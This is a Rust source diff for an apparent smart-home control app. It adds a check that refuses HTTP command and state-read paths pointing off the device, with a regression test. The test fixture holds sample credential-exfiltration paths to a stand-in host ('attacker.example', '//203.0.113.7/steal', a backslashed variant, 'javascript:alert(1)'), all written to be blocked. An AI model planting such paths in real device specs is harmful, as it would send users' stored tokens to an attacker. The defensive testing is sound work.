@@ -124,20 +124,70 @@ pub fn render_command(
         return Err(ProtocolError::EmptyCommand);
     };
 
+    let path = on_the_device(
+        substitute(path, command, command_name, values)?,
+        command_name,
+    )?;
+    // Substituted on exactly the terms the primary is: a fallback whose
+    // placeholders cannot be filled is no fallback, and failing the whole
+    // render over the SECOND spelling would take down a command whose first
+    // spelling was fine. A fallback that points off the device is another
+    // matter — that is the spec, not a missing value — so it fails the render
+    // exactly as a primary would.
+    let path_fallback = command
+        .path_fallback
+        .as_deref()
+        .and_then(|path| substitute(path, command, command_name, values).ok())
+        .map(|path| on_the_device(path, command_name))
+        .transpose()?;
     Ok(HttpRequest {
         method: method.to_string(),
-        path: substitute(path, command, command_name, values)?,
-        // Substituted on exactly the terms the primary is: a fallback whose
-        // placeholders cannot be filled is no fallback, and failing the whole
-        // render over the SECOND spelling would take down a command whose
-        // first spelling was fine.
-        path_fallback: command
-            .path_fallback
-            .as_deref()
-            .and_then(|path| substitute(path, command, command_name, values).ok()),
+        path,
+        path_fallback,
         body: render_http_body(command, command_name, values)?,
         headers: render_headers(command, command_name, values)?,
     })
+}
+
+/// A rendered path, refused if it names an address of its own.
+///
+/// The sender resolves the path against the device's address, and resolution
+/// honours whatever the reference carries: `https://elsewhere/x` or
+/// `//elsewhere/x` resolves to ELSEWHERE, and the request goes there with its
+/// declared headers — Vizio's `AUTH` token, from the stored credential — and
+/// any credential in the path itself. The spec-pack security floor compares
+/// TLS posture, not paths, so a pack copy of a real spec with one path
+/// swapped was enough. The SOAP controlURL, the probes and the WebSocket
+/// hand-over already keep to the device's address; this is the same rule at
+/// the renderer, and the Dart sender checks the resolved URI again.
+///
+/// Two shapes are an address rather than a path: a leading RFC 3986 scheme
+/// (`ALPHA *( ALPHA / DIGIT / "+" / "-" / "." ) ":"` before any `/`, `?` or
+/// `#`), and a leading pair of slashes — backslashes counted, since a lenient
+/// URL parser reads `/\host` as `//host`. Checked on the RENDERED text so a
+/// placeholder cannot assemble one either, though substituted values are
+/// percent-encoded and cannot contribute the `:` or `/` themselves. No
+/// catalogue spec is written either way, so this costs nothing legitimate —
+/// `every_vendored_http_path_is_device_relative` in `tests/vendored_assets.rs`
+/// pins that.
+fn on_the_device(path: String, label: &str) -> Result<String, ProtocolError> {
+    let bytes = path.as_bytes();
+    let authority = bytes.len() >= 2 && matches!(bytes[..2], [b'/' | b'\\', b'/' | b'\\']);
+    let scheme = path
+        .find([':', '/', '?', '#'])
+        .filter(|&end| bytes[end] == b':')
+        .is_some_and(|end| {
+            let mut chars = path[..end].chars();
+            chars.next().is_some_and(|c| c.is_ascii_alphabetic())
+                && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
+        });
+    if authority || scheme {
+        return Err(ProtocolError::UnsupportedCommandEncoding(format!(
+            "{label} renders the path {path:?}, which names an address of its own \
+             rather than a path on the device, so it is not sent"
+        )));
+    }
+    Ok(path)
 }
 
 /// Fill a command's declared `headers`, in declared order.
@@ -648,7 +698,8 @@ pub fn spec_wide_credential<'a>(spec: &'a DeviceSpec, param: &str) -> Option<&'a
 ///
 /// `label` names the thing being rendered in the failure — a command name, or
 /// the path itself for a bare `state_topic` — so a missing placeholder says
-/// which read could not be issued.
+/// which read could not be issued. A filled path that names an address of its
+/// own is refused here too, as a command's is (`on_the_device`).
 pub fn fill_path(
     spec: &DeviceSpec,
     path: &str,
@@ -681,7 +732,9 @@ pub fn fill_path(
         rest = &tail[end + 1..];
     }
     out.push_str(rest);
-    Ok(out)
+    // A read rides the same sender as a command, and a Hue-shaped
+    // `/api/{username}/...` carries the credential in the path itself.
+    on_the_device(out, label)
 }
 
 /// Whether every placeholder in `path` can be filled from the spec ALONE — no
@@ -692,7 +745,8 @@ pub fn fill_path(
 /// rule exists to keep off screen. The Hue bridge's `/api/{username}/sensors/
 /// {id}` is exactly that today — a credential this app does not yet store and
 /// a child id nothing enumerates — so it stays off, and the screen counts it
-/// among the controls it is honest about not drawing.
+/// among the controls it is honest about not drawing. A path naming an
+/// address off the device can never be requested either, and is not admitted.
 pub fn path_renderable_from_spec(spec: &DeviceSpec, path: &str) -> bool {
     fill_path(spec, path, &BTreeMap::new(), path).is_ok()
 }
@@ -1240,6 +1294,112 @@ commands:
         let fine =
             render_request(&spec(), "launch_defaulted", &values(&[("app_id", "a..b")])).unwrap();
         assert_eq!(fine.path, "/launch/a..b");
+    }
+
+    /// The sender resolves a rendered path against the device's address, and
+    /// resolution honours whatever the reference carries: a path that names
+    /// its own scheme or authority takes the request — declared headers, a
+    /// stored credential among them — to THAT host. Shaped as a spec-pack
+    /// copy of Vizio's key command with its path swapped. No catalogue spec
+    /// writes a path this way (`every_vendored_http_path_is_device_relative`),
+    /// so refusing it costs nothing legitimate.
+    #[test]
+    fn a_path_that_names_another_host_is_refused() {
+        const POINTED_AWAY: &str = r#"
+device:
+  name: "Pointed Away"
+  manufacturer: "Test"
+  manufacturer_status: "active"
+  protocol: "wifi"
+  category: "tv"
+http_endpoints:
+  - method: "GET"
+    path: "https://203.0.113.7/api/{token}/things"
+    name: "Things"
+commands:
+  absolute:
+    description: "A full URL on another host, the credential attached."
+    transport: "http"
+    method: "PUT"
+    path: "https://attacker.example/key_command/"
+    headers:
+      AUTH: "{auth_token}"
+    parameters:
+      auth_token:
+        type: "string"
+        source: "credential:auth_token"
+  network_path:
+    description: "No scheme, but an authority all the same."
+    transport: "http"
+    method: "POST"
+    path: "//203.0.113.7/steal"
+  backslashed:
+    description: "What a lenient URL parser reads as `//`."
+    transport: "http"
+    method: "POST"
+    path: '/\203.0.113.7/steal'
+  bare_scheme:
+    description: "A scheme with no authority is still not a path."
+    transport: "http"
+    method: "POST"
+    path: "javascript:alert(1)"
+  scheme_from_a_placeholder:
+    description: "The literal text after a value supplies the colon."
+    transport: "http"
+    method: "POST"
+    path: "{proto}://203.0.113.7/steal"
+    parameters:
+      proto:
+        type: "string"
+        default: "https"
+  fallback_away:
+    description: "A fine primary and a second spelling that leaves."
+    transport: "http"
+    method: "POST"
+    path: "/cover/Door/open"
+    path_fallback: "//203.0.113.7/cover/door/open"
+  colon_later:
+    description: "A colon after the first slash is path data, not a scheme."
+    transport: "http"
+    method: "GET"
+    path: "/printer/objects/query?webhooks&print_stats=state:x"
+"#;
+        let spec = parse_device_spec(POINTED_AWAY).expect("fixture spec parses");
+        let creds = values(&[("auth_token", "Z2x6aHh4eQ==")]);
+        for name in [
+            "absolute",
+            "network_path",
+            "backslashed",
+            "bare_scheme",
+            "scheme_from_a_placeholder",
+            "fallback_away",
+        ] {
+            let err = render_request(&spec, name, &creds)
+                .expect_err(&format!("{name} must not render a request"));
+            assert!(
+                matches!(&err, ProtocolError::UnsupportedCommandEncoding(reason)
+                    if reason.contains(name) && reason.contains("device")),
+                "{name}: {err:?}"
+            );
+        }
+        let fine = render_request(&spec, "colon_later", &creds).expect("a colon in a path is fine");
+        assert_eq!(
+            fine.path,
+            "/printer/objects/query?webhooks&print_stats=state:x"
+        );
+
+        // The state reads ride the same sender, so they are held to the same
+        // rule: an endpoint entry's path, and a bare `state_topic`.
+        let token = values(&[("token", "secret")]);
+        for state in ["Things", "//203.0.113.7/state", "/\\203.0.113.7/state"] {
+            let err = render_state_request(&spec, state, &token)
+                .expect_err(&format!("{state} must not render a read"));
+            assert!(
+                matches!(&err, ProtocolError::UnsupportedCommandEncoding(_)),
+                "{state}: {err:?}"
+            );
+        }
+        assert!(!path_renderable_from_spec(&spec, "//203.0.113.7/state"));
     }
 
     #[test]
